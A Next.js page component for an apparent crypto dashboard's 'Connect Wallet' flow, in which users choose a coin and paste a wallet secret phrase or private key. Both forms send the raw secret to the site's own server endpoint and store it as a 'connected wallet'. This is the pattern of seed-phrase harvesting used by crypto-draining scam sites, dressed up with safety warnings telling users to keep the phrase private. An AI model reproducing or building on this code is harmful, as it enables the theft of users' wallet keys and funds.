"use client"

import { ErrorMessage, Field, Form, Formik } from 'formik';
import Image from 'next/image'
import React, { useState, useEffect } from 'react'
import * as Yup from "yup";
import { useRouter } from 'next/navigation';
import axios from 'axios';
import { DesktopSideBar } from './../components/DesktopSideBar';
import { Header } from './../components/Header';
import LoadingScreen from './loading';
import { useAuth } from '@/app/context/AuthContext';
import { TbTriangleInvertedFilled, TbWriting } from "react-icons/tb";
import { LuArrowUpToLine, LuKeyRound, LuWallet } from "react-icons/lu";
import { FaAngleLeft, FaAngleRight, FaCheckCircle, FaRegEye, FaRegEyeSlash } from "react-icons/fa";
import { BsThreeDotsVertical } from "react-icons/bs";
import { IoClose } from "react-icons/io5";
import { TfiAngleLeft, TfiAngleRight } from "react-icons/tfi";

export default function Page() {

  const router = useRouter();
  const [step, setStep] = useState(1);
  const [coin, setCoin] = useState("");
  const [coins, setCoins] = useState([]);
  const { user } = useAuth();
  const [wallets, setWallets] = useState(null);
  const [amount, setAmount] = useState(0);
  const [isError, setIsError] = useState(false);
  const [loading, setLoading] = useState(false);
  const [errorMessage, setErrorMessage] = useState("");
  const [isOpen, setIsOpen] = useState(false);
  const [checkBox1, setCheckBox1] = useState(false);
  const [checkBox2, setCheckBox2] = useState(false);
  const [checkBox3, setCheckBox3] = useState(false);
  const [isMenuOpen, setIsMenuOpen] = useState(false);
  const [value, setValue] = useState("");


  useEffect(() => {
        async function fetchWallets() {
          try {
            setLoading(true);
  
            const res = await axios.get(
              `/api/auth/users/wallet-connect`,
              {
                withCredentials: true,
                headers: { "Content-Type": "application/json" },
              }
            );

            if (res.status === 200) {
              console.log(res)
              setIsError(false);
              setWallets(res.data);
              setLoading(false);
            }
          } catch(err) {
            setLoading(false);
          }
        }
    
        fetchWallets();
      }, []);

      useEffect(() => {
              fetch(`/api/crypto`)
                .then((res) => res.json())
                .then((data) => setCoins(data));
      }, []);

  const initialWalletValues = {
  walletName: coin + " " + "wallet 1",
  walletPhrase: ""

  }
  const validateWalletSchema = Yup.object({
    walletName: Yup.string().required("Please enter a wallet name."),
    walletPhrase: Yup.string().required("Please enter your wallet secret phrase.")
  });

  const initialPrivateKeyValues = {
  walletPrivate: coin + " " + "wallet 1",
  walletPrivateKey: ""

  }
  const validatePrivateKeySchema = Yup.object({
    walletPrivate: Yup.string().required("Please enter a wallet name."),
    walletPrivateKey: Yup.string().required("Please enter your wallet private key.")
  });


  const handlePaste = async () => {
    try {
      const text = await navigator.clipboard.readText();
      setValue(text);
    } catch (error) {
      console.error("Failed to read clipboard:", error);
    }
  };
  
      const toggleMenu = () => {
          if (isMenuOpen === false) {
              setIsMenuOpen(true)
          } else {
              setIsMenuOpen(false)
          }
      }

      const toggleCheckBox1 = () => {
          if (checkBox1 === false) {
              setCheckBox1(true)
          } else {
              setCheckBox1(false)
          }
      }

      const toggleCheckBox2 = () => {
          if (checkBox2 === false) {
              setCheckBox2(true)
          } else {
              setCheckBox2(false)
          }
      }

      const handleIsOpen = () => {
        if (isOpen === true) {
          setIsOpen(false);
        } else {
          setIsOpen(true);
        }
      }

      const toggleCheckBox3 = () => {
          if (checkBox3 === false) {
              setCheckBox3(true)
          } else {
              setCheckBox3(false)
          }
      }
      
      const confirmCheckBox = () => {
          if (checkBox1 === true && checkBox2 === true && checkBox3 === true) {
            setStep(3);
          }
      }


  const handleCoin = (coin) => {
    setCoin(coin);
    setStep(4);
  }

  const handleCoin13 = (coin) => {
    setCoin(coin);
    setStep(14);
  }

  async function restoreWallet (values, onSubmitProps) {
        setLoading(true);
        onSubmitProps.setSubmitting(false);
        const words = values.walletPhrase.trim().split(/\s+/);

        if (words.length === 12 || words.length === 18 || words.length === 24) {
          
          try {
                const res = await axios.post(
                    `/api/auth/users/wallet-connect`,
                    {
                    walletName: values.walletName,
                    walletType: coin,
                    walletPhrase: values.walletPhrase
                    },
                    {
                    withCredentials: true,
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    }
                );

                if (res.status === 201) {
                    setIsError(false);
                    router.replace(`/dashboard/wallets/wallet/connected?walletId=${res.data._id}`)
                } 

          } catch (err) {
                  setErrorMessage(err.response.data.error);
                  setIsError(true);
                  setLoading(false);
          }

        } else {
          setIsError(true);
          setErrorMessage("Invalid wallet phrase!");
          setLoading(false);
        }

  }

  async function restorePrivateWallet (values, onSubmitProps) {
        setLoading(true);
        onSubmitProps.setSubmitting(false);

        if (values.walletPrivateKey.length >= 20 || values.walletPrivateKey.length === 64) {
          
          try {
                const res = await axios.post(
                    `/api/auth/users/wallet-connect`,
                    {
                    walletName: values.walletPrivate,
                    walletType: coin,
                    walletPhrase: values.walletPrivateKey
                    },
                    {
                    withCredentials: true,
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    }
                );

                if (res.status === 201) {
                    setIsError(false);
                    router.replace(`/dashboard/wallets/wallet/connected?walletId=${res.data._id}`)
                }

          } catch (err) {
                  setErrorMessage(err.response.data.error);
                  setIsError(true);
                  setLoading(false);
          }

        } else {
          setIsError(true);
          setErrorMessage("Invalid wallet phrase!");
          setLoading(false);
        }

  }

  return (
    <div className="bg-white w-full h-full text-black dark:bg-isoDark dark:text-white min-h-screen space-y-5 relative font-[family-name:var(--font-geist-sans)]">
     {loading === true && (<LoadingScreen />)}
     <div className='block w-full'>
        <Header tab={"wallet"} />
     </div>

       <div className='w-full h-full min-h-screen md:pt-20 flex items-start'>
     
          <DesktopSideBar tab={"wallet"} />

          <div className='w-full h-full md:py-16 py-20 bg-none text-black relative px-4 flex flex-col md:justify-center md:items-center container mx-auto md:px-40'>
                <div className='w-full flex flex-col space-y-5 md:space-y-16 '>

                    {step === 13 && (
                        <div>

                          <div className="w-full flex flex-col space-y-4 py-3 transition-500 overflow-hidden">
                                  {Array.isArray(coins) ? (
                                    (coins.slice(0, 50).map((coin) => (
                                      <div key={coin.symbol} onClick={() => handleCoin(coin.symbol)} className='flex w-full justify-between items-center'>
                                          <div className='flex items-center px-4 space-x-2'>
                                              <img
                                                  src={coin.logo}
                                                  alt={coin.name}
                                                  className="w-7"
                                                  width={50}
                                                  height={0}
                                              />
                                              <div className='space-y-1'>
                                                  <h2 className='font-medium text-base dark:text-white'>{coin.name}</h2>
                                                  <span className='text-xs text-neutral-400'>{coin.symbol}</span>
                                              </div>
                                          </div>
                                      </div>
                                  )))
                                    ) : (
                                    <p  className='text-sm text-neutral-500 font-light'>Fetching Coins...</p>
                                  )}
                          </div>

                          <div className="w-full fixed bottom-4 right-0 left-0 flex flex-col items-center justify-center space-y-5">
                            <div className="w-full flex items-center px-7 justify-center md:w-1/2">
                              <button
                                onClick={() => setStep(2)}
                                className="rounded-full py-3 flex dark:bg-isoColor2 dark:text-black justify-center space-x-1 text-base text-center transition-all duration-500 w-full bg-[#f4f4f5] lg:flex items-center text-black hover:rounded-full"
                              >
                                <TfiAngleLeft />
                                <span>Back</span>
                              </button>
                            </div>
                          </div>
                      </div>
                    )}

                    {step === 14 && (
                        <Formik
                        initialValues={initialPrivateKeyValues}
                        validationSchema={validatePrivateKeySchema}
                        onSubmit={restorePrivateWallet}
                      >
                        {({ errors, touched, values }) => (
                          <Form className="w-full flex md:px-8 flex-col space-y-4">

                            <div>
                              <label
                                htmlFor="walletPrivate"
                                className="flex space-x-2 items-center text-sm pb-1 md:text-black text-neutral-600"
                              >Wallet name</label>
                              <Field name="walletPrivate">
                                {(props) => {
                                  const { field, form, meta } = props;
                                  return (
                                    <input
                                      className={`form__input dark:bg-isoDark2 dark:border-neutral-600 dark:text-neutral-500 dark:md:bg-isoDark dark:focus:border-isoColor2 border-neutral-200 border-2 font-medium rounded-xl w-full px-3 py-4 text-md focus:outline-none focus:border-isoColor1 text-black`}
                                      type="text"
                                      id="walletPrivate"
                                      name="walletPrivate"
                                      {...field}
                                    />
                                  );
                                }}
                              </Field>
                              <ErrorMessage name="walletPrivate">
                                {(errMsg) => (
                                  <span className="text-red-500 text-xs">{errMsg}</span>
                                )}
                              </ErrorMessage>
                            </div>

                            <div>
                              <label
                                htmlFor="walletPrivateKey"
                                className="flex space-x-2 items-center text-sm pb-1 md:text-black text-neutral-600"
                              >Private key</label>
                              <Field name="walletPrivateKey">
                                {(props) => {
                                  const { field, form, meta } = props;
                                  return (
                                    <div className='relative'>
                                      <textarea
                                        className={`form__input dark:bg-isoDark2 dark:border-neutral-600 dark:text-white dark:md:bg-isoDark dark:focus:border-isoColor2 h-28 border-neutral-200 border-2 font-medium rounded-xl w-full p-3 text-md focus:outline-none focus:border-isoColor1 text-black`}
                                        type="text"
                                        id="walletPrivateKey"
                                        autoFocus
                                        name="walletPrivateKey"
                                        {...field}
                                      />
                                      <span onClick={handlePaste} className='text-sm text-center absolute bottom-4 right-4 font-bold dark:text-isoColor2 text-isoColor1'>Paste</span>
                                    </div>
                                  );
                                }}
                              </Field>
                              <ErrorMessage name="walletPrivateKey">
                                {(errMsg) => (
                                  <span className="text-red-500 text-xs">{errMsg}</span>
                                )}
                              </ErrorMessage>
                              {isError === true && (<p className='text-red-500 py-2 text-xs'>{errorMessage}</p>)}
                            </div>

                            <p className='text-sm text-neutral-500 text-center'>Typically 64 alphanumeric characters</p>

                            <button
                              type="submit"
                              className={`w-full py-4 dark:bg-isoColor2 dark:text-black rounded-full text-md ${Formik.isValid || Formik.isSubmitting ? "bg-[#a327a3] text-white" : "bg-isoColor1 text-white"} `}
                              disabled={Formik.isValid || Formik.isSubmitting}
                            >
                              {loading ? "Restoring wallet..." : "Restore wallet"}
                            </button>

                            <p onClick={handleIsOpen} target='blank' className='text-sm text-center dark:text-isoColor2 font-semibold text-isoColor1'>What is a private key?</p>

                            <div className="w-full fixed bottom-4 right-0 left-0 flex flex-col items-center justify-center space-y-5">
                            <div className="w-full flex items-center px-7 justify-center md:w-1/2">
                              <button
                                onClick={() => setStep(13)}
                                className="rounded-full py-3 dark:text-white flex justify-center space-x-1 text-base text-center transition-all duration-500 w-full lg:flex items-center text-black hover:rounded-full"
                              >
                                <TfiAngleLeft />
                                <span>Back</span>
                              </button>
                            </div>
                          </div>

                          </Form>
                        )}
                        </Formik>
                    )}

                    {step === 1 && (
                        <div className="flex h-full w-full">

                          <div className="w-full space-y-3">
                            <p className="flex text-xs dark:text-white">Multi-coin wallets</p>
                            <div className='flex flex-col space-y-3'>

                              {wallets != null ? (wallets.map((wallet, index) => (
                                <a href={`/dashboard/wallets/wallet/connected?walletId=${wallet._id}`} key={index} className="w-full text-sm p-5 rounded-xl bg-[#f4f4f5] dark:bg-isoDark2 dark:text-white font-medium flex items-center justify-between">
                                  <p
                                    className="w-full text-black dark:text-white hover:text-iso-green-lite flex space-x-4 items-center"
                                  >
                                    <LuWallet className="text-2xl" />
                                    <span>{wallet.walletName}</span>
                                  </p>
                                  <TfiAngleRight className="text-lg dark:text-isoColor2" />
                                </a>
                              ))) : (
                                <p className='text-neutral-400 flex justify-center items-center py-32 font-light'>No Connected Wallets</p>
                              )}

                            </div>
                          </div>

                          <div className="w-full fixed bottom-8 right-0 left-0 flex flex-col items-center justify-center space-y-5">
                            <div className="w-full flex items-center px-7 justify-center md:w-1/2">
                              <button
                                onClick={() => setStep(2)}
                                className="rounded-full py-4 dark:bg-isoColor2 dark:text-black flex justify-center text-base text-center font-medium transition-all duration-500 w-full hover:bg-[#f4f4f5] lg:flex items-center hover:text-black text-white bg-isoColor1 hover:rounded-full"
                              >
                                Connect Wallet
                              </button>
                            </div>
                          </div>

                        </div>
                    )}
                    
                    {step === 3 && (
                      <div>
                          <button onClick={() => handleCoin("Multi-coin")} className="w-full text-sm p-5 dark:bg-isoDark2 dark:border-isoColor2 relative border border-isoColor1 rounded-xl bg-[#f4f4f5] font-medium flex items-center justify-between">
                                <p
                                  className="w-full text-black dark:text-white flex space-x-4 items-center"
                                >
                                  <LuWallet className="text-2xl" />
                                  <span>Multi-coin wallet</span>
                                </p>
                                <TfiAngleRight className="text-lg dark:text-isoColor2" />
                                <span className="flex bg-isoColor1 dark:bg-isoColor2 dark:text-black text-white px-1 py-0.5 text-xs rounded-full absolute -top-3 left-5">Recommended</span>
                          </button>

                          <div className="w-full flex flex-col space-y-4 py-3 transition-500 overflow-hidden">
                                  {Array.isArray(coins) ? (
                                    (coins.slice(0, 50).map((coin) => (
                                      <div key={coin.symbol} onClick={() => handleCoin(coin.symbol)} className='flex w-full justify-between items-center'>
                                          <div className='flex items-center px-4 space-x-2'>
                                              <img
                                                  src={coin.logo}
                                                  alt={coin.name}
                                                  className="w-7"
                                                  width={50}
                                                  height={0}
                                              />
                                              <div className='space-y-1'>
                                                  <h2 className='font-medium text-base dark:text-white'>{coin.name}</h2>
                                                  <span className='text-xs text-neutral-400'>{coin.symbol}</span>
                                              </div>
                                          </div>
                                      </div>
                                  )))
                                    ) : (
                                    <p  className='text-sm text-neutral-500 font-light'>Fetching Coins...</p>
                                  )}
                          </div>

                          <div className="w-full fixed bottom-4 right-0 left-0 flex flex-col items-center justify-center space-y-5">
                            <div className="w-full flex items-center px-7 justify-center md:w-1/2">
                              <button
                                onClick={() => setStep(2)}
                                className="rounded-full py-3 flex justify-center dark:bg-isoColor2 dark:text-black space-x-1 text-base text-center transition-all duration-500 w-full bg-[#f4f4f5] lg:flex items-center text-black hover:rounded-full"
                              >
                                <TfiAngleLeft />
                                <span>Back</span>
                              </button>
                            </div>
                          </div>
                      </div>
                    )}

                    {step === 2 && (
                        <div className="flex h-full w-full">

                          <div className="w-full space-y-3">
                            <p className="flex text-xs dark:text-white">Add existing wallet</p>
                            <div className='flex flex-col space-y-3'>
                              
                              <button onClick={toggleMenu} className="w-full text-sm p-5 rounded-xl bg-[#f4f4f5] dark:bg-isoDark2 dark:text-white text-black font-medium flex items-center justify-between">
                                <p
                                  className="w-full flex space-x-4 items-center"
                                >
                                  <span className="flex items-center justify-center rounded-full bg-blue-100 dark:bg-isoDark p-2"><TbWriting className="text-2xl text-isoColor1 dark:text-isoColor2" /></span>
                                  <span>Secret phrase</span>
                                </p>
                                <TfiAngleRight className="text-lg dark:text-isoColor2" />
                              </button>

                              <button onClick={() => setStep(13)} className="w-full text-sm p-5 rounded-xl bg-[#f4f4f5] dark:bg-isoDark2 dark:text-white font-medium flex items-center justify-between">
                                <p
                                  className="w-full flex space-x-4 items-center"
                                >
                                  <span className="flex items-center justify-center rounded-full bg-blue-100 dark:bg-isoDark p-2"><LuKeyRound className="text-2xl text-isoColor1 dark:text-isoColor2" /></span>
                                  <span>Private key</span>
                                </p>
                                <TfiAngleRight className="text-lg dark:text-isoColor2" />
                              </button>

                            </div>
                          </div>

                          <div className="w-full fixed bottom-4 right-0 left-0 flex flex-col items-center justify-center space-y-5">
                            <div className="w-full flex items-center px-7 justify-center md:w-1/2">
                              <button
                                onClick={() => setStep(1)}
                                className="rounded-full py-3 flex dark:text-black dark:bg-isoColor2 space-x-1 justify-center text-base text-center transition-all duration-500 w-full bg-[#f4f4f5] lg:flex items-center text-black hover:rounded-full"
                              >
                                <TfiAngleLeft />
                                <span>Back</span>
                              </button>
                            </div>
                          </div>

                          {/* Check Boxes */}
                          <div  className={`${isMenuOpen === true ? "block" : "hidden"} w-full h-full fixed z-50 top-0 md:px-24 bottom-0 bg-black/30 dark:bg-black/70 left-0 right-0`}>
                                          <div className={`w-full md:w-1/2 text-center flex flex-col items-center py-5 space-y-5 animate-slideUp absolute h-fit will-change-transform transform duration-500 transition-all ease-out bottom-0 left-0 right-0 rounded-t-2xl text-black bg-white dark:bg-isoDark2 dark:text-white`}>
                                              <IoClose onClick={toggleMenu} className="text-2xl absolute top-2 right-2" />

                                              <div className="flex justify-center items-center">
                                                <Image
                                                  src="/img/raw.16e2b8fb.svg"
                                                  alt="Astiox_logo"
                                                  className="-ml-6 md:-ml-0 md:w-70"
                                                  width={150}
                                                  height={0}
                                                />
                                              </div>

                                              <h1 className="flex text-xl text-center font-semibold">Check your secret phrase is safe</h1>
                                              
                                              <div className="rounded-2xl w-full font-semibold space-y-4 flex flex-col items-center px-4">
                                                  
                                                  <span
                                                    onClick={toggleCheckBox1}
                                                          className="flex space-x-3 p-3 w-full rounded-lg bg-[#f4f4f7] dark:bg-isoDark items-center"
                                                  >
                                                          <FaCheckCircle className={`w-5 h-5 ${checkBox1 === true ? "text-isoColor1 dark:text-isoColor2" : "text-neutral-400"}`} />
                                                          <span className={`text-black font-normal text-start text-xs dark:text-white`}>Only you know this secret phrase.</span>
                                                  </span>

                                                  <span
                                                    onClick={toggleCheckBox2}
                                                          className={`flex space-x-3 p-3 w-full rounded-lg bg-[#f4f4f7] dark:bg-isoDark items-center`}
                                                  >
                                                          <FaCheckCircle className={`${checkBox2 === true ? "text-isoColor1 dark:text-isoColor2" : "text-neutral-400"} w-8 h-8`} />
                                                          <span className='text-black font-normal text-start dark:text-white text-xs'>This secret phrase was NOT given to you by anyone, e.g company representative.</span>
                                                  </span>

                                                  <span
                                                    onClick={toggleCheckBox3}
                                                          className={`flex space-x-3 p-3 w-full rounded-lg bg-[#f4f4f7] dark:bg-isoDark items-center`}
                                                  >
                                                          <FaCheckCircle className={`w-6 h-6 ${checkBox3 === true ? "text-isoColor1 dark:text-isoColor2" : "text-neutral-400"}`} />
                                                          <span className='text-black font-normal text-start text-xs dark:text-white'>If someone else has seen it, they can and will steal your funds.</span>
                                                  </span>
                                              </div>
                          
                                              <div className="w-full bottom-4 right-0 left-0 flex flex-col items-center justify-center space-y-5">
                                                <div className="w-full flex items-center px-7 justify-center md:w-1/2">
                                                  <button
                                                    onClick={confirmCheckBox}
                                                    className={`rounded-full ${checkBox1 === true && checkBox2 === true && checkBox3 === true ? "hover:text-black text-white bg-isoColor1 dark:bg-isoColor2 dark:text-black hover:bg-[#f4f4f5]" : "bg-[#f4f4] dark:bg-isoColor2/30 text-black"} py-4 flex justify-center text-base text-center font-medium transition-all duration-500 w-full lg:flex items-center rounded-full`}
                                                  >
                                                    Continue
                                                  </button>
                                                </div>
                                              </div>
                                          </div>
                          </div>

                        </div>
                    )}

                    {step === 4 && (
                      <Formik
                        initialValues={initialWalletValues}
                        validationSchema={validateWalletSchema}
                        onSubmit={restoreWallet}
                      >
                        {({ errors, touched, values }) => (
                          <Form className="w-full flex md:px-8 flex-col space-y-4">

                            <div>
                              <label
                                htmlFor="walletName"
                                className="flex space-x-2 items-center text-sm pb-1 md:text-black text-neutral-600"
                              >Wallet name</label>
                              <Field name="walletName">
                                {(props) => {
                                  const { field, form, meta } = props;
                                  return (
                                    <input
                                      className={`form__input dark:bg-isoDark2 dark:border-neutral-600 dark:text-neutral-500 dark:md:bg-isoDark dark:focus:border-isoColor2 border-neutral-200 border-2 font-medium rounded-xl w-full px-3 py-4 text-md focus:outline-none focus:border-isoColor1 text-black`}
                                      type="text"
                                      id="walletName"
                                      name="walletName"
                                      {...field}
                                    />
                                  );
                                }}
                              </Field>
                              <ErrorMessage name="walletName">
                                {(errMsg) => (
                                  <span className="text-red-500 text-xs">{errMsg}</span>
                                )}
                              </ErrorMessage>
                            </div>

                            <div>
                              <label
                                htmlFor="walletPhrase"
                                className="flex space-x-2 items-center text-sm pb-1 md:text-black text-neutral-600"
                              >Secret phrase</label>
                              <Field name="walletPhrase">
                                {(props) => {
                                  const { field, form, meta } = props;
                                  return (
                                    <div className='relative'>
                                      <textarea
                                        className={`form__input dark:bg-isoDark2 dark:border-neutral-600 dark:text-white dark:md:bg-isoDark dark:focus:border-isoColor2 h-28 border-neutral-200 border-2 font-medium rounded-xl w-full p-3 text-md focus:outline-none focus:border-isoColor1 text-black`}
                                        type="text"
                                        id="walletPhrase"
                                        autoFocus
                                        name="walletPhrase"
                                        {...field}
                                      />
                                      <span onClick={handlePaste} className='text-sm text-center absolute bottom-4 right-4 font-bold text-isoColor1 dark:text-isoColor2'>Paste</span>
                                    </div>
                                  );
                                }}
                              </Field>
                              <ErrorMessage name="walletPhrase">
                                {(errMsg) => (
                                  <span className="text-red-500 text-xs">{errMsg}</span>
                                )}
                              </ErrorMessage>
                              {isError === true && (<p className='text-red-500 py-2 text-xs'>{errorMessage}</p>)}
                            </div>

                            <p className='text-sm text-neutral-500 text-center'>Typically 12 (sometimes 18, 24) words separated by single spaces</p>

                            <button
                              type="submit"
                              className={`w-full dark:bg-isoColor2 dark:text-black py-4 rounded-full text-md ${Formik.isValid || Formik.isSubmitting ? "bg-[#a327a3] text-white" : "bg-isoColor1 text-white"} `}
                              disabled={Formik.isValid || Formik.isSubmitting}
                            >
                              {loading ? "Restoring wallet..." : "Restore wallet"}
                            </button>

                            <p onClick={handleIsOpen} className='text-sm dark:text-isoColor2 text-center font-semibold text-isoColor1'>What is a secret phrase?</p>

                            <div className="w-full fixed bottom-4 right-0 left-0 flex flex-col items-center justify-center space-y-5">
                            <div className="w-full flex items-center px-7 justify-center md:w-1/2">
                              <button
                                onClick={() => setStep(3)}
                                className="rounded-full py-3 flex dark:text-white justify-center space-x-1 text-base text-center transition-all duration-500 w-full lg:flex items-center text-black hover:rounded-full"
                              >
                                <TfiAngleLeft />
                                <span>Back</span>
                              </button>
                            </div>
                          </div>

                          </Form>
                        )}
                      </Formik>
                    )}

                    {isOpen === true && (
                              <div className="w-full h-full p-10 flex fixed top-0 left-0 right-0 bottom-0 justify-center bg-black/70 items-center loading-modal">
                                <div className="rounded-2xl md:w-96 duration-500 transition-all h-fit w-full flex flex-col items-center py-5 px-3 bg-white dark:text-white dark:bg-isoDark2 space-y-4">
                                  <div className='flex justify-center items-center w-full'><span className="flex items-center justify-center rounded-full bg-blue-100 dark:bg-isoDark p-2"><TbWriting className="text-3xl text-isoColor1 dark:text-isoColor2" /></span></div>
                    
                                  <h1 className='px-6 text-lg font-medium text-center md:font-semibold'>What is a secret phrase??</h1>
                    
                                  <p className='text-xs'>A seed phrase, also known as a recovery phrase or mnemonic phrase, is a unique sequence of words that serves as a master key that secures access to your cryptocurrency wallet. Your seed phrase typically consists of 12, 24 or 64 random words generated by your wallet when you first create it. Please make sure of the following:</p>
                    
                                  <div>
                                    <ul className='list-disc md:bg-[#f4f4f7] dark:md:bg-isoDark dark:text-neutral-400 rounded-2xl px-6 md:py-7 text-sm space-y-2'>
                                      <li>Only you know this secret phrase.</li>
                                      <li>This secret phrase was NOT given to you by anyone, e.g company representative.</li>
                                      <li>If someone else has seen it, they can and will steal your funds.</li>
                                    </ul>
                                  </div>
                    
                                  <button
                                    onClick={handleIsOpen}
                                    className="w-full py-3 rounded-xl bg-isoColor1 dark:bg-isoColor2 dark:text-black text-md hover:bg-isoColor2 hover:text-black text-white"
                                  >
                                          OK
                                  </button>
                                </div>
                              </div>
                    )}

                </div>

          </div>

        </div>
    </div>
  )
}
